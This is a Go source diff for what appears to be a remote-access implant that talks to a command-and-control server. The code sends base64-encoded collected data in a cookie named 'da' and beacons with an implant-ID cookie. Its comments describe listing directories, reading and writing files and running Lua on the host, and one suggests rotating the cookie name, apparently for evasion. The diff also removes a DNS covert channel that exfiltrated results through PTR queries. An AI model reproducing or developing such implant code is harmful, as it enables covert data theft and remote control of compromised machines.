@@ -8,12 +8,7 @@ import (
 	"io"
 	"log"
 	"net/http"
-	"strconv"
 )
-
-// dnsConf helps determine if DNS comms are enabled
-var dnsConfStr string
-var dnsConf, _ = strconv.ParseBool(dnsConfStr)
 
 // ResponseData Struct to hold the response format from the server
 // The key is the HMAC used to verify the data retrieved using a shared secret
@@ -32,8 +27,6 @@ var PostURI string
 var GetURI string
 
 func main() {
-	num, _ := strconv.Atoi(CompUUID)
-	var hexId uint16 = uint16(num)
 	// Load configuration from embedded data
 	conf, err := shared.LoadConfig()
 	if err != nil {
@@ -64,6 +57,7 @@ func main() {
 		if shouldComp {
 			//fmt.Println(hardVals)
 			encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
+			// "da" can be changed to a randomly chosen string to cycle through
 			tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
 			// makeGetRequest 3 times with a 10 second delay between each attempt
 			// if the request is successful, break the loop
@@ -121,24 +115,14 @@ func main() {
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				switch dnsConf {
-				case true:
-					encRes := shared.StringToIPv6List("test success")
-					err := shared.SendPTRRequest(hexId, encRes)
-					if err != true {
-						return
-					}
-					fmt.Println("Success")
-					break
-				case false:
-					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-					request, err := shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
-					if err != nil {
-						return
-					}
-					fmt.Println(request)
-					break
+
+				impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+				err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+				if err != nil {
+					return
 				}
+				break
+
 			} else {
 				fmt.Println("HMAC is invalid or message was tampered with.")
 				break
@@ -208,24 +192,14 @@ func main() {
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				switch dnsConf {
-				case true:
-					encRes := shared.StringToIPv6List("test success")
-					err := shared.SendPTRRequest(hexId, encRes)
-					if err != true {
-						return
-					}
-					fmt.Println("Success")
-					break
-				case false:
-					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-					request, err := shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
-					if err != nil {
-						return
-					}
-					fmt.Println(request)
-					break
+
+				impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+				err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+				if err != nil {
+					fmt.Println(err)
 				}
+				break
+
 			case false:
 				fmt.Println("HMAC is invalid or message was tampered with.")
 				break
